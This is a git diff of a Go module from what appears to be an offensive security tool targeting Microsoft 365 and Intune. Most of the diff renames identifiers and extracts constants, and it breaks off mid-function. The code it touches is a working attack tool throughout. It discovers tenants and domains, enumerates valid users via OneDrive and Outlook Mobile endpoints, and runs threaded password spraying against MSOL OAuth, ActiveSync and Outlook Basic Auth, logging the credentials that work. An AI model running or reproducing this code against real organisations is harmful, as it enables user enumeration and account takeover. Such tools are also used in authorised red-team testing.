@@ -1,28 +1,30 @@
 package intune
 
 import (
-	"dauthi/utils"
 	"encoding/base64"
 	"fmt"
+	"github.com/mr-pmillz/dauthi/utils"
 	"regexp"
 	"strings"
 	"time"
 )
 
-type mdma struct {
-	opts     utils.ChargeOpts
-	logr     *utils.Logger
-	tenant   []string
-	domain   []string
-	tokenURL string
-	cycle
+// MDMA ...
+type MDMA struct {
+	Opts     utils.ChargeOpts
+	Logr     *utils.Logger
+	Tenant   []string
+	Domain   []string
+	TokenURL string
+	Cycle
 }
 
-type cycle struct {
-	buff   *chan bool
-	block  *chan bool
-	length int
-	api    *utils.API
+// Cycle ...
+type Cycle struct {
+	Buff   *chan bool
+	Block  *chan bool
+	Length int
+	API    *utils.API
 }
 
 const (
@@ -30,21 +32,21 @@ const (
   Intune Options:
     -a                     User-Agent for request [default: Agent/20.08.0.23/Android/11]
 
-    -tenant                o365 Tenant
+    -Tenant                o365 Tenant
   `
 
 	// Methods are available tool methods
 	Methods = `
   Intune Methods:
-    disco                  intune endpoint discovery query
-    disco-tenant           o365 tenant/domain query
-    prof-outlook           Outlook Mobile service profiling
-    enum-onedrive          o365 onedrive email enumeration of target o365 tenant
-    enum-onedrive-full     o365 onedrive email enumeration of all o365 tenant/domains
+    Disco                  intune endpoint discovery query
+    Disco-Tenant           o365 Tenant/Domain query
+    Prof-outlook           Outlook Mobile service profiling
+    enum-onedrive          o365 onedrive email enumeration of target o365 Tenant
+    enum-onedrive-full     o365 onedrive email enumeration of all o365 Tenant/domains
     enum-outlook           Outlook Mobile user enumeration
-    auth-async             SFA against 0365 Active-Sync endpoint
-    auth-msol              SFA against o365 OAuth endpoint
-    auth-outlook           SFA against o365 Outlook Basic Auth
+    Auth-async             SFA against 0365 Active-Sync endpoint
+    Auth-msol              SFA against o365 OAuth endpoint
+    Auth-outlook           SFA against o365 Outlook Basic Auth
 	`
 
 	discoveryAPI     = `https://enterpriseenrollment.%s`
@@ -71,19 +73,23 @@ const (
 		`"remote_auth_protocol": "BasicAuth", "remote_server": {"hostname": "outlook.office365.com", "disable_certificate_validation": true}, ` +
 		`"remote_auth_credential": {"userId": "%s", "secret": "%s", "email_address": "%s"}, ` +
 		`"display_name": "%s"}`
+	GET              = `GET`
+	ProfOutlook      = "Prof-outlook"
+	POST             = `POST`
+	enumOneDriveFull = "enum-onedrive-full"
+	authMSOL         = "Auth-msol"
+	enumOneDrive     = "enum-onedrive"
+	authAsync        = "Auth-async"
+	enumOutlook      = "enum-outlook"
+	authOutlook      = "Auth-outlook"
 )
 
 func b64encode(v []byte) string {
 	return base64.StdEncoding.EncodeToString(v)
 }
 
-func b64decode(v string) []byte {
-	data, _ := base64.StdEncoding.DecodeString(v)
-	return data
-}
-
-// Init mdma with default values and return obj
-func Init(o utils.ChargeOpts) *mdma {
+// Init MDMA with default values and return obj
+func Init(o utils.ChargeOpts) *MDMA {
 	if o.Agent == "" {
 		o.Agent = "Agent/20.08.0.23/Android/11"
 	}
@@ -92,13 +98,13 @@ func Init(o utils.ChargeOpts) *mdma {
 	}
 	log := utils.NewLogger("intune")
 
-	return &mdma{
-		opts:   o,
-		tenant: []string{},
-		domain: []string{},
-		logr:   log,
-		cycle: cycle{
-			api: &utils.API{
+	return &MDMA{
+		Opts:   o,
+		Tenant: []string{},
+		Domain: []string{},
+		Logr:   log,
+		Cycle: Cycle{
+			API: &utils.API{
 				Debug: o.Debug,
 				Log:   log,
 				Proxy: o.Proxy},
@@ -106,31 +112,31 @@ func Init(o utils.ChargeOpts) *mdma {
 	}
 }
 
-// clone() copies an *mdma for process threading
-func (m *mdma) clone() *mdma {
-	clone := Init(m.opts) // assign target
-	clone.domain = m.domain
-	clone.tenant = m.tenant
-	clone.cycle.block = m.cycle.block
-	clone.cycle.buff = m.cycle.buff
+// Clone copies an *MDMA for process threading
+func (m *MDMA) Clone() *MDMA {
+	clone := Init(m.Opts) // assign target
+	clone.Domain = m.Domain
+	clone.Tenant = m.Tenant
+	clone.Cycle.Block = m.Cycle.Block
+	clone.Cycle.Buff = m.Cycle.Buff
 
 	return clone
 }
 
-// Wrapper to parse JSON/XML objects
-func (m *mdma) parser(data interface{}, p string) bool {
+// Parser wrapper to parse JSON/XML objects
+func (m *MDMA) Parser(data interface{}, p string) bool {
 	switch p {
 	case "json":
-		err := m.cycle.api.Resp.ParseJSON(data)
+		err := m.Cycle.API.Resp.ParseJSON(data)
 		if err != nil {
-			m.logr.Errorf([]interface{}{m.opts.Method}, "Response Marshall Error: %v", err)
+			m.Logr.Errorf([]interface{}{m.Opts.Method}, "Response Marshall Error: %v", err)
 			return true
 		}
 
 	case "xml":
-		err := m.cycle.api.Resp.ParseXML(data)
+		err := m.Cycle.API.Resp.ParseXML(data)
 		if err != nil {
-			m.logr.Errorf([]interface{}{m.opts.Method}, "Response Marshall Error: %v", err)
+			m.Logr.Errorf([]interface{}{m.Opts.Method}, "Response Marshall Error: %v", err)
 			return true
 		}
 	}
@@ -138,30 +144,31 @@ func (m *mdma) parser(data interface{}, p string) bool {
 	return false
 }
 
-func (m *mdma) pullDomains(silent bool) {
+// PullDomains ...
+func (m *MDMA) PullDomains(silent bool) {
 	var domains struct {
 		Domain []string `xml:"Body>GetFederationInformationResponseMessage>Response>Domains>Domain"`
 	}
 
-	m.cycle.api.Name = `autodiscover`
-	m.cycle.api.URL = tenantAPI
-	m.cycle.api.Data = fmt.Sprintf(tenantPOST, m.opts.Endpoint)
-	m.cycle.api.Method = `POST`
-	m.cycle.api.Opts = &map[string]interface{}{
+	m.Cycle.API.Name = `autodiscover`
+	m.Cycle.API.URL = tenantAPI
+	m.Cycle.API.Data = fmt.Sprintf(tenantPOST, m.Opts.Endpoint)
+	m.Cycle.API.Method = POST
+	m.Cycle.API.Opts = &map[string]interface{}{
 		"Header": map[string][]string{
 			"Content-Type":    []string{"text/xml; charset=utf-8"},
 			"SOAPAction":      []string{"http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetFederationInformation"},
 			"User-Agent":      []string{"AutodiscoverClient"},
 			"Accept-Encoding": []string{"identity"}}}
-	m.cycle.api.Proxy = "" //Proxy request hangs for API call?
+	m.Cycle.API.Proxy = "" // Proxy request hangs for API call?
 
-	m.cycle.api.WebCall()
-	if m.cycle.api.Resp.Status != 200 {
-		m.logr.Failf([]interface{}{m.opts.Method}, "Tenant Request Failed")
+	m.Cycle.API.WebCall()
+	if m.Cycle.API.Resp.Status != 200 {
+		m.Logr.Failf([]interface{}{m.Opts.Method}, "Tenant Request Failed")
 		return
 	}
 
-	if m.parser(&domains, "xml") {
+	if m.Parser(&domains, "xml") {
 		return
 	}
 
@@ -169,225 +176,231 @@ func (m *mdma) pullDomains(silent bool) {
 	for _, dom := range domains.Domain {
 		if strings.Contains(dom, "onmicrosoft.com") {
 			tencount++
-			dom := strings.Replace(dom, ".onmicrosoft.com", "", -1)
-			m.tenant = append(m.tenant, dom)
+			dom := strings.ReplaceAll(dom, ".onmicrosoft.com", "")
+			m.Tenant = append(m.Tenant, dom)
 		} else {
 			domcount++
-			m.domain = append(m.domain, dom)
+			m.Domain = append(m.Domain, dom)
 		}
 	}
 
 	if !silent {
 		if tencount > 0 {
-			m.logr.Infof([]interface{}{tencount}, "o365 Tenant(2) Identified")
-			for _, v := range m.tenant {
-				m.logr.Successf([]interface{}{v}, "Tenant Domain")
+			m.Logr.Infof([]interface{}{tencount}, "o365 Tenant(2) Identified")
+			for _, v := range m.Tenant {
+				m.Logr.Successf([]interface{}{v}, "Tenant Domain")
 			}
 		}
 
 		if domcount > 0 {
-			m.logr.Infof([]interface{}{domcount}, "o365 Domain(s) Identified")
-			for _, v := range m.domain {
-				m.logr.Successf([]interface{}{v}, "Alias Domain")
+			m.Logr.Infof([]interface{}{domcount}, "o365 Domain(s) Identified")
+			for _, v := range m.Domain {
+				m.Logr.Successf([]interface{}{v}, "Alias Domain")
 			}
 		}
 	}
 }
 
-func (m *mdma) getToken() {
+// GetToken ...
+func (m *MDMA) GetToken() {
 	var token struct {
 		TokenURL string `json:"token_endpoint"`
 	}
 
-	m.cycle.api.Name = `openid-query`
-	m.cycle.api.URL = fmt.Sprintf(openIDAPI, m.opts.Endpoint)
-	m.cycle.api.Data = ""
-	m.cycle.api.Method = `GET`
-	m.cycle.api.Opts = &map[string]interface{}{
+	m.Cycle.API.Name = `openid-query`
+	m.Cycle.API.URL = fmt.Sprintf(openIDAPI, m.Opts.Endpoint)
+	m.Cycle.API.Data = ""
+	m.Cycle.API.Method = GET
+	m.Cycle.API.Opts = &map[string]interface{}{
 		"Header": map[string][]string{
-			"User-Agent": []string{m.opts.Agent}}}
+			"User-Agent": []string{m.Opts.Agent}}}
 
-	m.cycle.api.WebCall()
-
-	// Validate response status
-	if m.cycle.api.Resp.Status != 200 {
-		if m.opts.Debug > 0 {
-			m.logr.Debugf([]interface{}{m.opts.Endpoint}, "Invalid Server Response Code: %v", m.cycle.api.Resp.Status)
-		}
-		m.logr.Errorf([]interface{}{"openid-query"}, "Failed to identify tenant ID")
-		return
-	}
-
-	if m.parser(&token, "json") {
-		return
-	}
-
-	m.tokenURL = token.TokenURL
-}
-
-func (m *mdma) disco() {
-	m.cycle.api.Name = `discoveryAPI`
-	m.cycle.api.URL = fmt.Sprintf(discoveryAPI, m.opts.Endpoint)
-	m.cycle.api.Data = ""
-	m.cycle.api.Method = `GET`
-	m.cycle.api.Opts = nil
-
-	m.cycle.api.WebCall()
+	m.Cycle.API.WebCall()
 
 	// Validate response status
-	if m.cycle.api.Resp.Status != 302 {
-		if m.opts.Debug > 0 {
-			m.logr.Debugf([]interface{}{m.opts.Endpoint}, "Invalid Server Response Code: %v", m.cycle.api.Resp.Status)
+	if m.Cycle.API.Resp.Status != 200 {
+		if m.Opts.Debug > 0 {
+			m.Logr.Debugf([]interface{}{m.Opts.Endpoint}, "Invalid Server Response Code: %v", m.Cycle.API.Resp.Status)
 		}
-		m.logr.Failf([]interface{}{m.opts.Endpoint}, "Discovery Failed")
+		m.Logr.Errorf([]interface{}{"openid-query"}, "Failed to identify Tenant ID")
 		return
 	}
-	m.validate()
+
+	if m.Parser(&token, "json") {
+		return
+	}
+
+	m.TokenURL = token.TokenURL
 }
 
-func (m *mdma) prof() {
-	m.cycle.api.Name = m.opts.Method
-	m.cycle.api.URL = outlookMobileAPI
-	m.cycle.api.Data = ""
-	m.cycle.api.Method = `GET`
-	m.cycle.api.Opts = &map[string]interface{}{
+// Disco ...
+func (m *MDMA) Disco() {
+	m.Cycle.API.Name = `discoveryAPI`
+	m.Cycle.API.URL = fmt.Sprintf(discoveryAPI, m.Opts.Endpoint)
+	m.Cycle.API.Data = ""
+	m.Cycle.API.Method = GET
+	m.Cycle.API.Opts = nil
+
+	m.Cycle.API.WebCall()
+
+	// Validate response status
+	if m.Cycle.API.Resp.Status != 302 {
+		if m.Opts.Debug > 0 {
+			m.Logr.Debugf([]interface{}{m.Opts.Endpoint}, "Invalid Server Response Code: %v", m.Cycle.API.Resp.Status)
+		}
+		m.Logr.Failf([]interface{}{m.Opts.Endpoint}, "Discovery Failed")
+		return
+	}
+	m.Validate()
+}
+
+// Prof ...
+func (m *MDMA) Prof() {
+	m.Cycle.API.Name = m.Opts.Method
+	m.Cycle.API.URL = outlookMobileAPI
+	m.Cycle.API.Data = ""
+	m.Cycle.API.Method = GET
+	m.Cycle.API.Opts = &map[string]interface{}{
 		"Header": map[string][]string{
-			"User-Agent": []string{m.opts.Agent},
-			"X-Email":    []string{m.opts.UserName}}}
+			"User-Agent": []string{m.Opts.Agent},
+			"X-Email":    []string{m.Opts.UserName}}}
 
-	m.cycle.api.WebCall()
+	m.Cycle.API.WebCall()
 
 	// Validate response status
-	if m.cycle.api.Resp.Status != 200 {
-		m.logr.Failf([]interface{}{m.opts.Endpoint}, "Profiling Failed")
+	if m.Cycle.API.Resp.Status != 200 {
+		m.Logr.Failf([]interface{}{m.Opts.Endpoint}, "Profiling Failed")
 		return
 	}
-	m.validate()
+	m.Validate()
 }
 
-func (m *mdma) auth() {
+// Auth ...
+//
+//nolint:gocognit
+func (m *MDMA) Auth() {
 	var file []byte
 	var err error
 
-	if m.opts.File != "" {
-		file, err = utils.ReadFile(m.opts.File)
+	if m.Opts.File != "" {
+		file, err = utils.ReadFile(m.Opts.File)
 		if err != nil {
-			m.logr.Fatalf([]interface{}{m.opts.File}, "File Read Failure")
+			m.Logr.Fatalf([]interface{}{m.Opts.File}, "File Read Failure")
 		}
 	}
 
 	lines := strings.Split(string(file), "\n")
-	block := make(chan bool, m.opts.Threads)
+	block := make(chan bool, m.Opts.Threads)
 	buff := make(chan bool, len(lines))
-	m.cycle.block = &block
-	m.cycle.buff = &buff
-	m.cycle.length = len(lines)
+	m.Cycle.Block = &block
+	m.Cycle.Buff = &buff
+	m.Cycle.Length = len(lines)
 
-	if m.opts.Method != "enum-onedrive-full" {
-		m.logr.Infof([]interface{}{m.opts.Method}, "threading %d values across %d threads", m.cycle.length, m.opts.Threads)
+	if m.Opts.Method != enumOneDriveFull {
+		m.Logr.Infof([]interface{}{m.Opts.Method}, "threading %d values across %d threads", m.Cycle.Length, m.Opts.Threads)
 	}
 
-	if m.opts.Method == "auth-msol" {
-		m.getToken()
-		if m.tokenURL == "" {
-			m.logr.Errorf([]interface{}{m.opts.Method}, "Unable to identify Token Endpoint")
+	if m.Opts.Method == authMSOL {
+		m.GetToken()
+		if m.TokenURL == "" {
+			m.Logr.Errorf([]interface{}{m.Opts.Method}, "Unable to identify Token Endpoint")
 			return
 		}
 	}
 
 	for _, line := range lines {
 		if len(lines) > 1 && line == "" {
-			*m.cycle.buff <- false
+			*m.Cycle.Buff <- false
 			continue
 		}
 
-		target := m.clone()
+		target := m.Clone()
 
 		if line == "" {
-			line = target.opts.UserName
+			_ = target.Opts.UserName
 		} else {
-			target.opts.UserName = line
+			target.Opts.UserName = line
 		}
 
-		switch m.opts.Method {
-		case "enum-onedrive":
+		switch m.Opts.Method {
+		case enumOneDrive:
 			udscore := regexp.MustCompile(`(?:@|\.)`)
 
-			target.cycle.api.Name = target.opts.Method
-			target.cycle.api.URL = fmt.Sprintf(onedriveAPI, target.opts.Tenant, udscore.ReplaceAllString(target.opts.UserName+"@"+target.opts.Endpoint, `_`))
-			target.cycle.api.Data = ""
-			target.cycle.api.Method = `GET`
-			target.cycle.api.Opts = &map[string]interface{}{
+			target.Cycle.API.Name = target.Opts.Method
+			target.Cycle.API.URL = fmt.Sprintf(onedriveAPI, target.Opts.Tenant, udscore.ReplaceAllString(target.Opts.UserName+"@"+target.Opts.Endpoint, `_`))
+			target.Cycle.API.Data = ""
+			target.Cycle.API.Method = GET
+			target.Cycle.API.Opts = &map[string]interface{}{
 				"Header": map[string][]string{
-					"User-Agent": []string{target.opts.Agent}}}
+					"User-Agent": []string{target.Opts.Agent}}}
 
-		case "enum-onedrive-full":
-			if target.opts.Tenant == "" ||
-				len(target.domain) == 0 {
-				target.pullDomains(true)
+		case enumOneDriveFull:
+			if target.Opts.Tenant == "" ||
+				len(target.Domain) == 0 {
+				target.PullDomains(true)
 
-				if len(target.tenant) == 0 {
-					m.logr.Errorf([]interface{}{target.opts.Method}, "Failed to pull tenant details")
+				if len(target.Tenant) == 0 {
+					m.Logr.Errorf([]interface{}{target.Opts.Method}, "Failed to pull Tenant details")
 					return
 				}
 
-				m.logr.Infof([]interface{}{target.opts.Method}, "threading %d values across %d threads", len(lines)*(len(target.tenant)*len(target.domain)), target.opts.Threads)
-				for _, ten := range target.tenant {
+				m.Logr.Infof([]interface{}{target.Opts.Method}, "threading %d values across %d threads", len(lines)*(len(target.Tenant)*len(target.Domain)), target.Opts.Threads)
+				for _, ten := range target.Tenant {
 					if !utils.Resolver(ten + "-my.sharepoint.com") {
-						m.logr.Infof([]interface{}{target.opts.Method, ten}, "Tenant non-Resolvable: tasklist decreased of %v", len(lines)*len(target.domain))
+						m.Logr.Infof([]interface{}{target.Opts.Method, ten}, "Tenant non-Resolvable: tasklist decreased of %v", len(lines)*len(target.Domain))
 						continue // Skip Unresolvable
 					}
 
-					for _, dom := range target.domain {
-						target.opts.Tenant = ten
-						target.opts.Endpoint = dom
-						target.auth()
+					for _, dom := range target.Domain {
+						target.Opts.Tenant = ten
+						target.Opts.Endpoint = dom
+						target.Auth()
 					}
 				}
 				return
 			} else {
 				udscore := regexp.MustCompile(`(?:@|\.)`)
 
-				target.cycle.api.Name = target.opts.Method
-				target.cycle.api.URL = fmt.Sprintf(onedriveAPI, target.opts.Tenant, udscore.ReplaceAllString(target.opts.UserName+"@"+target.opts.Endpoint, `_`))
-				target.cycle.api.Data = ""
-				target.cycle.api.Method = `GET`
-				target.cycle.api.Opts = &map[string]interface{}{
+				target.Cycle.API.Name = target.Opts.Method
+				target.Cycle.API.URL = fmt.Sprintf(onedriveAPI, target.Opts.Tenant, udscore.ReplaceAllString(target.Opts.UserName+"@"+target.Opts.Endpoint, `_`))
+				target.Cycle.API.Data = ""
+				target.Cycle.API.Method = GET
+				target.Cycle.API.Opts = &map[string]interface{}{
 					"Header": map[string][]string{
-						"User-Agent": []string{target.opts.Agent}}}
+						"User-Agent": []string{target.Opts.Agent}}}
 
-				target.thread()
+				target.Thread()
 				continue
 			}
 
-		case "enum-outlook":
-			target.cycle.api.Name = target.opts.Method
-			target.cycle.api.URL = outlookMobileAPI
-			target.cycle.api.Data = ""
-			target.cycle.api.Method = `GET`
-			target.cycle.api.Opts = &map[string]interface{}{
+		case enumOutlook:
+			target.Cycle.API.Name = target.Opts.Method
+			target.Cycle.API.URL = outlookMobileAPI
+			target.Cycle.API.Data = ""
+			target.Cycle.API.Method = GET
+			target.Cycle.API.Opts = &map[string]interface{}{
 				"Header": map[string][]string{
-					"User-Agent": []string{target.opts.Agent},
-					"X-Email":    []string{target.opts.UserName}}}
+					"User-Agent": []string{target.Opts.Agent},
+					"X-Email":    []string{target.Opts.UserName}}}
 
-		case "auth-msol":
-			target.cycle.api.Name = target.opts.Method
-			target.cycle.api.URL = m.tokenURL
-			target.cycle.api.Data = fmt.Sprintf(msolPOST, target.opts.UserName, target.opts.Password)
-			target.cycle.api.Method = `POST`
-			target.cycle.api.Opts = &map[string]interface{}{
+		case authMSOL:
+			target.Cycle.API.Name = target.Opts.Method
+			target.Cycle.API.URL = m.TokenURL
+			target.Cycle.API.Data = fmt.Sprintf(msolPOST, target.Opts.UserName, target.Opts.Password)
+			target.Cycle.API.Method = POST
+			target.Cycle.API.Opts = &map[string]interface{}{
 				"Header": map[string][]string{
 					"Accept-Encoding": []string{"gzip, deflate"},
 					"Accept":          []string{"application/json"},
 					"Content-Type":    []string{"application/x-www-form-urlencoded"},
 					"User-Agent":      []string{"Windows-AzureAD-Authentication-Provider/1.0 3236.84364"}}}
 
-		case "auth-outlook":
-			target.cycle.api.Name = target.opts.Method
-			target.cycle.api.URL = outlookAuthAPI
-			target.cycle.api.Data = fmt.Sprintf(outlookAuthAPIPost, target.opts.UserName, target.opts.Password, target.opts.Email, target.opts.Email)
-			target.cycle.api.Method = `POST`
-			target.cycle.api.Opts = &map[string]interface{}{
+		case authOutlook:
+			target.Cycle.API.Name = target.Opts.Method
+			target.Cycle.API.URL = outlookAuthAPI
+			target.Cycle.API.Data = fmt.Sprintf(outlookAuthAPIPost, target.Opts.UserName, target.Opts.Password, target.Opts.Email, target.Opts.Email)
+			target.Cycle.API.Method = POST
+			target.Cycle.API.Opts = &map[string]interface{}{
 				"Header": map[string][]string{
 					"X-DeviceType": []string{"Android"},
 					"Accept":       []string{"application/json"},
@@ -396,69 +409,72 @@ func (m *mdma) auth() {
 					"X-Shadow":     []string{"2a6af961-7d3c-416b-bcfe-72ac4531e659"},
 					"Content-Type": []string{"application/json"}}}
 
-		case "auth-async":
-			target.cycle.api.Name = target.opts.Method
-			target.cycle.api.URL = asyncAPI
-			target.cycle.api.Data = ``
-			target.cycle.api.Method = `OPTIONS`
-			target.cycle.api.Opts = &map[string]interface{}{
+		case authAsync:
+			target.Cycle.API.Name = target.Opts.Method
+			target.Cycle.API.URL = asyncAPI
+			target.Cycle.API.Data = ``
+			target.Cycle.API.Method = `OPTIONS`
+			target.Cycle.API.Opts = &map[string]interface{}{
 				"Header": map[string][]string{
-					"User-Agent":    []string{target.opts.Agent},
-					"Authorization": []string{b64encode([]byte(target.opts.UserName + ":" + target.opts.Password))},
+					"User-Agent":    []string{target.Opts.Agent},
+					"Authorization": []string{b64encode([]byte(target.Opts.UserName + ":" + target.Opts.Password))},
 					"Content-Type":  []string{"application/x-www-form-urlencoded"}}}
 
 		default:
-			m.logr.Failf([]interface{}{m.opts.Method}, "Unknown Method Called")
+			m.Logr.Failf([]interface{}{m.Opts.Method}, "Unknown Method Called")
 		}
-		target.thread()
+		target.Thread()
 	}
 
-	for i := 0; i < m.cycle.length; i++ {
-		<-*m.cycle.buff
+	for i := 0; i < m.Cycle.Length; i++ {
+		<-*m.Cycle.Buff
 	}
-	close(*m.cycle.block)
-	close(*m.cycle.buff)
+	close(*m.Cycle.Block)
+	close(*m.Cycle.Buff)
 }
 
-// thread represents the threading process to loop multiple requests
-func (m *mdma) thread() {
-	*m.cycle.block <- true
+// Thread represents the threading process to loop multiple requests
+func (m *MDMA) Thread() {
+	*m.Cycle.Block <- true
 	go func() {
-		m.cycle.api.WebCall()
+		m.Cycle.API.WebCall()
 
-		if m.cycle.api.Resp.Status == 0 {
-			if m.opts.Miss < m.opts.Retry {
-				m.opts.Miss++
-				m.logr.Infof([]interface{}{m.opts.Tenant, m.opts.Endpoint, m.opts.UserName, m.opts.Password}, "Retrying Request")
-				<-*m.cycle.block
-				m.thread()
+		if m.Cycle.API.Resp.Status == 0 {
+			if m.Opts.Miss < m.Opts.Retry {
+				m.Opts.Miss++
+				m.Logr.Infof([]interface{}{m.Opts.Tenant, m.Opts.Endpoint, m.Opts.UserName, m.Opts.Password}, "Retrying Request")
+				<-*m.Cycle.Block
+				m.Thread()
 				return
 			}
-			m.logr.Failf([]interface{}{m.opts.Tenant, m.opts.Endpoint, m.opts.UserName, m.opts.Password}, "Null Server Response")
+			m.Logr.Failf([]interface{}{m.Opts.Tenant, m.Opts.Endpoint, m.Opts.UserName, m.Opts.Password}, "Null Server Response")
 		}
-		m.validate()
+		m.Validate()
 
-		// Sleep interval through thread loop
-		time.Sleep(time.Duration(m.opts.Sleep) * time.Second)
-		<-*m.cycle.block
-		*m.cycle.buff <- true
+		// Sleep interval through Thread loop
+		time.Sleep(time.Duration(m.Opts.Sleep) * time.Second)
+		<-*m.Cycle.Block
+		*m.Cycle.Buff <- true
 	}()
 }
 
-func (m *mdma) validate() {
-	switch m.opts.Method {
-	case "disco":
-		if m.cycle.api == nil {
-			m.logr.Failf([]interface{}{m.opts.Endpoint}, "Discovery Failed")
-		} else if m.cycle.api.Resp.Header["Location"][0] == "https://intune.microsoft.com/" {
-			m.logr.Successf([]interface{}{"intune.microsoft.com"}, "Endpoint Discovered")
+// Validate ...
+//
+//nolint:gocognit
+func (m *MDMA) Validate() {
+	switch m.Opts.Method {
+	case "Disco":
+		if m.Cycle.API == nil {
+			m.Logr.Failf([]interface{}{m.Opts.Endpoint}, "Discovery Failed")
+		} else if m.Cycle.API.Resp.Header["Location"][0] == "https://intune.microsoft.com/" {
+			m.Logr.Successf([]interface{}{"intune.microsoft.com"}, "Endpoint Discovered")
 		}
 
-	case "enum-onedrive", "enum-onedrive-full":
-		if m.cycle.api.Resp.Status == 302 {
-			if len(m.cycle.api.Resp.Header["Location"]) > 0 {
-				if strings.Contains(m.cycle.api.Resp.Header["Location"][0], "my.sharepoint.com") {
-					m.logr.Successf([]interface{}{m.opts.Tenant, m.opts.Endpoint, m.opts.UserName}, "Valid User")
+	case enumOneDrive, enumOneDriveFull:
+		if m.Cycle.API.Resp.Status == 302 {
+			if len(m.Cycle.API.Resp.Header["Location"]) > 0 {
+				if strings.Contains(m.Cycle.API.Resp.Header["Location"][0], "my.sharepoint.com") {
+					m.Logr.Successf([]interface{}{m.Opts.Tenant, m.Opts.Endpoint, m.Opts.UserName}, "Valid User")
 				} else {
 					break
 				}
@@ -466,9 +482,9 @@ func (m *mdma) validate() {
 				break
 			}
 		}
-		m.logr.Failf([]interface{}{m.opts.Tenant, m.opts.Endpoint, m.opts.UserName}, "Invalid User")
+		m.Logr.Failf([]interface{}{m.Opts.Tenant, m.Opts.Endpoint, m.Opts.UserName}, "Invalid User")
 
-	case "enum-outlook", "prof-outlook":
+	case enumOutlook, ProfOutlook:
 		var check struct {
 			Email    string `json:"email"`
 			Services []struct {
@@ -484,133 +500,130 @@ func (m *mdma) validate() {
 			} `json:"protocols"`
 		}
 
-		if m.cycle.api.Resp.Status != 200 {
-			m.logr.Failf([]interface{}{m.opts.Endpoint}, "Nonexistent Domain")
+		if m.Cycle.API.Resp.Status != 200 {
+			m.Logr.Failf([]interface{}{m.Opts.Endpoint}, "Nonexistent Domain")
 			return
-		} else if m.parser(&check, "json") {
+		} else if m.Parser(&check, "json") {
 			return
 		}
 
-		if m.opts.Method == "prof-outlook" {
+		if m.Opts.Method == ProfOutlook {
 			if len(check.Services) > 0 {
 				for _, i := range check.Services {
-					m.logr.Successf([]interface{}{i.Service, i.Protocol, i.Hostname}, "Supported Service: %s", i.AAD)
+					m.Logr.Successf([]interface{}{i.Service, i.Protocol, i.Hostname}, "Supported Service: %s", i.AAD)
 				}
 			}
 			if len(check.Protocols) > 0 {
 				for _, i := range check.Protocols {
-					m.logr.Successf([]interface{}{i.Protocol, i.Hostname}, "Supported Protocol: %s", i.AAD)
+					m.Logr.Successf([]interface{}{i.Protocol, i.Hostname}, "Supported Protocol: %s", i.AAD)
 				}
 			}
 			return
 		}
 
 		if len(check.Services) > 0 {
-			m.logr.Successf([]interface{}{m.opts.UserName}, "Valid User")
+			m.Logr.Successf([]interface{}{m.Opts.UserName}, "Valid User")
 			return
 		}
-		m.logr.Failf([]interface{}{m.opts.UserName}, "Invalid User")
+		m.Logr.Failf([]interface{}{m.Opts.UserName}, "Invalid User")
 
-	case "auth-msol":
-		if m.cycle.api.Resp.Status == 200 {
-			m.logr.Successf([]interface{}{m.opts.UserName, m.opts.Password}, "Successful Authentication")
-		} else if m.cycle.api.Resp.Status == 400 {
+	case authMSOL:
+		switch {
+		case m.Cycle.API.Resp.Status == 200:
+			m.Logr.Successf([]interface{}{m.Opts.UserName, m.Opts.Password}, "Successful Authentication")
+		case m.Cycle.API.Resp.Status == 400:
 			var check struct {
 				Error string `json:"error_description"`
 			}
-			if m.parser(&check, "json") {
+			if m.Parser(&check, "json") {
 				return
 			}
-			// Error Message Body
-			// AADSTS50126: Error validating credentials due to invalid username or password.\r\n
 			re := regexp.MustCompile(`^(.+?): (.+?)\n`)
 			data := re.FindStringSubmatch(check.Error)
-			m.logr.Failf([]interface{}{m.opts.UserName, m.opts.Password, data[1]}, "%s", data[2])
-
-		} else {
-			m.logr.Failf([]interface{}{m.opts.UserName, m.opts.Password}, "Unknown Response")
+			m.Logr.Failf([]interface{}{m.Opts.UserName, m.Opts.Password, data[1]}, "%s", data[2])
+		default:
+			m.Logr.Failf([]interface{}{m.Opts.UserName, m.Opts.Password}, "Unknown Response")
 		}
 
-	case "auth-outlook":
-		m.logr.Infof([]interface{}{m.opts.Method}, "Under development")
-		m.logr.Infof([]interface{}{m.opts.Method}, "Status: %v - Headers: %v - Body: %s", m.cycle.api.Resp.Status, m.cycle.api.Resp.Header, m.cycle.api.Resp.Body)
+	case authOutlook:
+		m.Logr.Infof([]interface{}{m.Opts.Method}, "Under development")
+		m.Logr.Infof([]interface{}{m.Opts.Method}, "Status: %v - Headers: %v - Body: %s", m.Cycle.API.Resp.Status, m.Cycle.API.Resp.Header, m.Cycle.API.Resp.Body)
 
-	case "auth-async":
-		if m.cycle.api.Resp.Status == 200 {
-			m.logr.Successf([]interface{}{m.opts.UserName, m.opts.Password}, "Successful Authentication")
+	case authAsync:
+		if m.Cycle.API.Resp.Status == 200 {
+			m.Logr.Successf([]interface{}{m.Opts.UserName, m.Opts.Password}, "Successful Authentication")
 			return
 		}
-		m.logr.Failf([]interface{}{m.opts.Email, m.opts.Password}, "Failed Authentication")
-
+		m.Logr.Failf([]interface{}{m.Opts.Email, m.Opts.Password}, "Failed Authentication")
 	}
 }
 
 // Call represents the switch function for activating all class methods
-func (m *mdma) Call() {
-	switch m.opts.Method {
-	case "disco":
-		m.disco()
+func (m *MDMA) Call() {
+	switch m.Opts.Method {
+	case "Disco":
+		m.Disco()
 
-	case "disco-tenant":
-		m.pullDomains(false)
+	case "Disco-Tenant":
+		m.PullDomains(false)
 
-	case "prof-outlook":
-		if m.opts.Email == "" && m.opts.File == "" {
-			m.logr.Errorf([]interface{}{m.opts.Method}, "Email/File required")
+	case ProfOutlook:
+		if m.Opts.Email == "" && m.Opts.File == "" {
+			m.Logr.Errorf([]interface{}{m.Opts.Method}, "Email/File required")
 			return
 		}
-		m.opts.UserName = m.opts.Email
-		m.prof()
+		m.Opts.UserName = m.Opts.Email
+		m.Prof()
 
-	case "enum-onedrive":
-		if m.opts.UserName == "" &&
-			m.opts.File == "" ||
-			m.opts.Tenant == "" {
-			m.logr.Errorf([]interface{}{m.opts.Method}, "Tenant/User/File required")
+	case enumOneDrive:
+		if m.Opts.UserName == "" &&
+			m.Opts.File == "" ||
+			m.Opts.Tenant == "" {
+			m.Logr.Errorf([]interface{}{m.Opts.Method}, "Tenant/User/File required")
 			return
 		}
-		m.auth()
+		m.Auth()
 
-	case "enum-onedrive-full":
-		if m.opts.UserName == "" && m.opts.File == "" {
-			m.logr.Errorf([]interface{}{m.opts.Method}, "User/File required")
+	case enumOneDriveFull:
+		if m.Opts.UserName == "" && m.Opts.File == "" {
